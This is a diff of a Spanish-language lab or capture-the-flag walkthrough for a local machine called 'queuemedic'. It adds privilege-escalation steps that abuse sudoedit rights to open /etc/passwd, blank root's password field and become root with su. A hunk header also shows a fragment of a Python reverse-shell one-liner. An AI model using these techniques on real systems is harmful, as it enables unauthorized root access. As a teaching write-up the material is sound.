@@ -1,11 +1,12 @@
-### 1) Iniciamos la maquina.
+1) Iniciamos la maquina.
 ```bash
 sudo ./auto_deploy.sh queuemedic.tar
 ```
-![Diagrama del sistema](./ANEXOS/Pasted%20image%2020240925173632.png)
 
-### 2) Nos dirigimos al navegador e ingresamos la dirección http://172.17.0.2.
-![./ANEXOS/Pasted image 20240925173823.png]
+![[Pasted image 20240925173632.png]]
+
+2) Nos dirigimos al navegador e ingresamos la dirección http://172.17.0.2.
+![[Pasted image 20240925173823.png]]
 *Al ingresar a la url se carga un formulario de acceso.*
 
 ![[Pasted image 20240925180151.png]]
@@ -94,4 +95,13 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 	 ![[Pasted image 20241011092359.png]]
 19) Como tengo un usuario llamado con el mismo nombre que el usuario de la web y como ya tengo una contraseña lo que hago es poner la misma contraseña y ahi ingreso al usuario jessica del sistema.
 	 ![[Pasted image 20241011092814.png]]
-	20) 
+20) Ahora con `sudo -l` listo los privilegios que tiene el usuario jessica, en este caso tiene los privilegios root para utilizar suodedit en la varpeta /var/www/html/.
+	![[Pasted image 20241011102543.png]]
+21) Para elevar privilegios a root primeramente tengo que setear el editor global a nano ya que vim no esta instalado y al editarlo también pongo la opción que se me abra para editar el archivo /etc/passwd.
+	![[Pasted image 20241011103016.png]]
+22) Ahora que ya tengo todo seteado abro el editor en la ubicación que vimos al listar son sudo -l, entonces ejecuto sudoedit /var/www/html/, Se me abrirá automáticamente el archivo /etc/passwd.
+	![[Pasted image 20241011103622.png]]
+24) Ahora que obtuve acceso para editar el archivo /etc/passwd como root lo que queda es eliminar la letra x que esta en el usuario root y esto significa que le quito la contraseña que tenia asignada anteriormente.
+	![[Pasted image 20241011103944.png]]
+25) Guardo los cambios y salgo y luego escribo su y presiono enter y ya obtengo acceso a root.
+![[Pasted image 20241011104942.png]]
